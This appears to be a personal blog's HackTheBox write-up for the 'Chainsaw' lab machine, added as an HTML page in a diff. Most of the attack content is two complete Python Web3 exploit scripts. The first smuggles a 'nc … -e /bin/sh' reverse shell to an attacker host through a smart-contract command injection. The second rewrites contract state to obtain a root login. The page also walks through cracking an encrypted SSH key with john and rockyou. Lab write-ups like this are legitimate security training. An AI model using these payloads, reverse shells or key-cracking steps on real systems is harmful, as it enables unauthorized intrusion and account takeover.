@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 19 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手 - Chainsaw - ETH and Disk Block" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 19</h1>
+          <p class="post-date">Posted <time datetime="2019-07-24">Jul 24, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="chainsaw">Chainsaw</h1>
+
+<p>Nmap: 21 Anomymous FTP with vsftpd(ftp:ftp), 22 SSH, 9801 (HTTP)</p>
+
+<h2 id="user">User</h2>
+
+<p>Anomymously list all the files in the FTP, then get <code>WeaponizedPing.(sol|json)</code>, and dynamically changing <code>address.txt</code></p>
+
+<p>Use Web3Py with the existing contract address, issue a transaction with our payload, you&rsquo;ll get a reverse shell as <code>administrator (UID=1001)</code>. Same way like box Jarvis.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+# -*- encoding:utf-8 -*-
+#
+# Licensed under AGPL v3
+# Copyright(C) 2019 kmahyyg
+#
+
+from web3 import Web3
+import logging
+import json
+import sys
+import requests
+
+logger = logging.getLogger('default_log')
+handler = logging.StreamHandler()
+formatter = logging.Formatter(&quot;%(levelname)s | %(message)s&quot;)
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+logger.setLevel(logging.INFO)
+
+
+# Print help
+def printusage():
+    print(&quot;Can only be used in Chainsaw - HTB, as a helper function of getting user.&quot;)
+    print(&quot;Usage: &quot; + sys.argv[0] + &quot; &lt;CONTRACT ADDRESS&gt; &lt;ATTCKER IP&gt; &lt;ATTACKER NC PORT&gt;&quot;)
+
+
+# Get predefined address
+try:
+    ftp_contraddr = sys.argv[1]
+    logger.info(&quot;Predefined Contract Address: &quot; + ftp_contraddr)
+except IndexError:
+    logger.error(&quot;Predefined Contract Address not found&quot;)
+    printusage()
+    sys.exit(1)
+
+# Attacker info
+try:
+    AttackHost = sys.argv[2]
+    AttackPort = sys.argv[3]
+    AttackPayload = &quot;localhost; nc &quot; + AttackHost + &quot; &quot; + AttackPort + &quot; -e /bin/sh&quot;
+except IndexError:
+    logger.error(&quot;Attack information not found.&quot;)
+    printusage()
+    sys.exit(1)
+
+# SSH Port Forward: localhost:8545:10.10.10.142:9810
+ethneturl = &quot;http://localhost:8545&quot;
+logger.info(&quot;The 10.10.10.142:9810 should be forwarded to {localip}&quot;.format(localip=ethneturl))
+
+# predenfined contract address read from the file
+predefined_cont_addr = Web3.toChecksumAddress(ftp_contraddr)
+logger.info(&quot;YOU SHOULD MODIFY THE ADDRESS AND PAYLOAD BEFORE RUN THIS SCRIPT!&quot;)
+input(&quot;Please confirm the above notification, then press enter to continue&quot;)
+
+# Detect if port-forward working
+r = requests.get(ethneturl, timeout=5)
+if r.status_code == 400:
+    logger.info(&quot;Port Forward seems working, go to next step...&quot;)
+else:
+    logger.error(&quot;Private ETH Network forward to {localip} is not successful.&quot;.format(localip=ethneturl))
+    sys.exit(1)
+
+
+# Web3Py related code
+w3eng = Web3(Web3.HTTPProvider(ethneturl))
+
+network_status = w3eng.isConnected()
+logger.info(&quot;Check if connected: &quot; + str(network_status))
+if not network_status:
+    print(&quot;System network does not connect.&quot;)
+    sys.exit(1)
+
+# --- Learning and Testing Code ---
+# --- Should be commented when finally use ---
+
+# Dump the private chain accounts
+logger.info(&quot;Trying to dump the accounts...&quot;)
+all_acc = w3eng.eth.accounts
+# logger.info(&quot;Trying to get balance of each account...&quot;)
+# for accidx in range(0, len(all_acc)):
+#     print(&quot;{par1}: {par2}&quot;.format(par1=str(all_acc[accidx]), par2=w3eng.eth.getBalance(all_acc[accidx])))
+
+# --- Learning and Testing Code End ---
+
+# According to Solidity compiler document, for new contract, must: account == 0
+# construct new contract OR Using the existing contract
+
+# set pre-funded account as sender
+w3eng.eth.defaultAccount = all_acc[0]  # if new contract, account = 0
+# Read contract ABI from json
+cont_json = open('assets/WeaponizedPing.json', 'r').read()
+cont_json = json.loads(cont_json)
+cur_abi = cont_json['abi']
+cur_cont_addr = predefined_cont_addr
+
+cur_cont = w3eng.eth.contract(address=cur_cont_addr, abi=cur_abi)
+cur_cont_funcs = cur_cont.functions
+logger.info(&quot;Get Contract Functions: &quot; + str(cur_cont_funcs))
+
+# RCE
+exploit = cur_cont_funcs.setDomain(AttackPayload).transact()
+logger.info(&quot;Transaction with RCE sent, Hash is: &quot; + Web3.toHex(exploit))
+logger.info(&quot;Waiting for transaction to be mined...&quot;)
+receipt = w3eng.eth.waitForTransactionReceipt(exploit)
+print(&quot;Receipt Found: &quot;, sep='')
+print(w3eng.eth.getTransactionReceipt(exploit))
+finalres = cur_cont.functions.getDomain().call()
+logger.info(&quot;Payload returned back is: &quot; + finalres)
+logger.info(&quot;DONE! You should get reverse shell now.&quot;)
+</code></pre>
+
+<p>After shell, check <code>/home/administrator/maintain</code>, you know that he is gonna distribute the private key via email. And you also found <code>.ipfs</code> in his home, so</p>
+
+<pre><code class="language-bash">administrator@chainsaw:/home/administrator/.ipfs$ grep -rwni &quot;bobby&quot;
+</code></pre>
+
+<p>You will find a data file inside the ipfs and get the base64 encoded ssh private key encrypted with passphrase.</p>
+
+<p>On your local:</p>
+
+<pre><code class="language-sh"># ln -s /usr/share/john/ssh2john.py /usr/local/bin/ssh2john
+$ ssh2john ./privkey_bobby &gt; bobby_sshhash
+$ john ./bobby_sshhash --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh
+PASSWORD IS: jackychain
+</code></pre>
+
+<p>Then you get the user.</p>
+
+<h2 id="root">Root</h2>
+
+<p>You&rsquo;ll find a SUID file: <code>/home/bobby/projects/ChainsawClub/ChainsawClub</code></p>
+
+<p>Then Web3Py again:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+# -*- encoding:utf-8 -*-
+#
+# Licensed under AGPL v3
+# Copyright(C) 2019 kmahyyg
+#
+
+import json
+import logging
+import sys
+
+import requests
+from web3 import Web3
+
+logger = logging.getLogger('default_log')
+handler = logging.StreamHandler()
+formatter = logging.Formatter(&quot;%(levelname)s | %(message)s&quot;)
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+logger.setLevel(logging.INFO)
+
+
+# Print help
+def printusage():
+    print(&quot;Can only be used in Chainsaw - HTB, as a helper function of getting root.&quot;)
+    print(&quot;Usage: &quot; + sys.argv[0] + &quot; &lt;CONTRACT ADDRESS&gt;&quot;)
+
+
+# Get predefined address
+try:
+    ftp_contraddr = sys.argv[1]
+    logger.info(&quot;Predefined Contract Address: &quot; + ftp_contraddr)
+except IndexError:
+    logger.error(&quot;Predefined Contract Address not found&quot;)
+    printusage()
+    sys.exit(1)
+
+# SSH Port Forward
+ethneturl = &quot;http://localhost:8545&quot;
+logger.critical(&quot;ssh -L 8545:127.0.0.1:63991 -N -T -i storage/chainsaw/bobby.key.enc bobby@10.10.10.142 -v&quot;)
+logger.info(&quot;The 127.0.0.1:63991 should be SSH-forwarded to {localip} as bobby@10.10.10.142&quot;.format(localip=ethneturl))
+
+# predenfined contract address read from the file
+predefined_cont_addr = Web3.toChecksumAddress(ftp_contraddr)
+logger.info(&quot;YOU SHOULD MODIFY THE ADDRESS AND PAYLOAD BEFORE RUN THIS SCRIPT!&quot;)
+input(&quot;Please confirm the above notification, then press enter to continue&quot;)
+
+# Detect if port-forward working
+r = requests.get(ethneturl, timeout=5)
+if r.status_code == 400:
+    logger.info(&quot;Port Forward seems working, go to next step...&quot;)
+else:
+    logger.error(&quot;Private ETH Network forward to {localip} is not successful.&quot;.format(localip=ethneturl))
+    sys.exit(1)
+
+# Web3Py related code
+w3eng = Web3(Web3.HTTPProvider(ethneturl))
+
+network_status = w3eng.isConnected()
+logger.info(&quot;Check if connected: &quot; + str(network_status))
+if not network_status:
+    print(&quot;System network does not connect.&quot;)
+    sys.exit(1)
+
+logger.info(&quot;Trying to dump the accounts...&quot;)
+all_acc = w3eng.eth.accounts
+w3eng.eth.defaultAccount = all_acc[0]
+cont_json = open('assets/ChainsawClub.json', 'r').read()
+cont_json = json.loads(cont_json)
+cur_abi = cont_json['abi']
+cur_cont_addr = predefined_cont_addr
+cur_cont = w3eng.eth.contract(address=cur_cont_addr, abi=cur_abi)
+cur_cont_funcs = cur_cont.functions
+logger.info(&quot;Get Contract Functions: &quot; + str(cur_cont_funcs))
+
+# SET PASSWORD AND NEW USER
+
+exploit1 = cur_cont_funcs.setUsername('fuc123root').transact()
+logger.critical(&quot;REMEMBER: Username: fuc123root , Password:7b45r5ca1&quot;)
+logger.info(&quot;Transaction sent, Hash is: &quot; + Web3.toHex(exploit1))
+logger.info(&quot;Waiting for transaction to be mined...&quot;)
+receipt = w3eng.eth.waitForTransactionReceipt(exploit1)
+w3eng.eth.getTransactionReceipt(exploit1)
+
+exploit2 = cur_cont_funcs.setPassword('fe9ed8836679fd78f8cd8956b77e254b').transact()  # md5-hashed: 7b45r5ca1
+logger.info(&quot;Transaction sent, Hash is: &quot; + Web3.toHex(exploit2))
+logger.info(&quot;Waiting for transaction to be mined...&quot;)
+receipt = w3eng.eth.waitForTransactionReceipt(exploit2)
+w3eng.eth.getTransactionReceipt(exploit2)
+
+exploit3 = cur_cont_funcs.setApprove(True).transact()
+logger.info(&quot;Transaction sent, Hash is: &quot; + Web3.toHex(exploit3))
+logger.info(&quot;Waiting for transaction to be mined...&quot;)
+receipt = w3eng.eth.waitForTransactionReceipt(exploit3)
+w3eng.eth.getTransactionReceipt(exploit3)
+
+exploitXI = cur_cont_funcs.getBalance().call()
+logger.critical(&quot;Current Account Balance: &quot; + str(exploitXI))
+logger.info(&quot;All supply will be transfered.&quot;)
+
+exploitXII = cur_cont_funcs.getSupply().call()
+logger.critical(&quot;Current supply: &quot; + str(exploitXII))
+
+exploit4 = cur_cont_funcs.transfer(int(exploitXII)).transact()
+logger.info(&quot;Transaction sent, Hash is: &quot; + Web3.toHex(exploit4))
+logger.info(&quot;Waiting for transaction to be mined...&quot;)
+receipt = w3eng.eth.waitForTransactionReceipt(exploit4)
+w3eng.eth.getTransactionReceipt(exploit4)
+
+# Get result
+
+print(&quot;Current Account Info: &quot;)
+exploit5 = cur_cont_funcs.getUsername().call()
+print(&quot;Username: &quot; + exploit5)
+
+exploit6 = cur_cont_funcs.getPassword().call()
+print(&quot;MD5 hashed password: &quot; + exploit6)
+
+exploit7 = cur_cont_funcs.getApprove().call()
+print(&quot;Approved: &quot; + str(exploit7))
+
+exploit8 = cur_cont_funcs.getSupply().call()
+print(&quot;Now Supply: &quot; + str(exploit8) + &quot;/1000&quot;)
+
+exploit9 = cur_cont_funcs.getBalance().call()
+print(&quot;Your account balance: &quot; + str(exploit9))
+
+logger.info(&quot;DONE!&quot;)
+</code></pre>
+
+<p>Two things to notice:</p>
+
+<ul>
+<li>To build transaction, you must submit password with md5-hashed, but login with plain text.</li>
+<li>To get logged in, set <code>approve</code> to True, and transfer all supply you can.</li>
+</ul>
+
+<p>Then you will get a root shell. But not root flag&hellip;</p>
+
+<p>Use <code>dpkg -S /sbin/*</code>, you&rsquo;ll find a tool called <code>bmap</code> which is not installed with the package management system of Debian.</p>
+
+<p>Then run <code>bmap --mode slack /root/root.txt</code> to display data in slack space, then you have the root flag.</p>
+
+<h1 id="referrence">Referrence</h1>
+
+<ul>
+<li><a href="http://www.dappuniversity.com/articles/web3-py-intro">http://www.dappuniversity.com/articles/web3-py-intro</a></li>
+<li><a href="https://solidity-cn.readthedocs.io/">https://solidity-cn.readthedocs.io/</a></li>
+</ul>
+
+<p>(END)</p>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup18/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 18</h2>
+    <p class="card-text">HackTheBox 练手 - Arkham - Java Deserialization Vuln</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-07-18 718:00">Jul 18, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
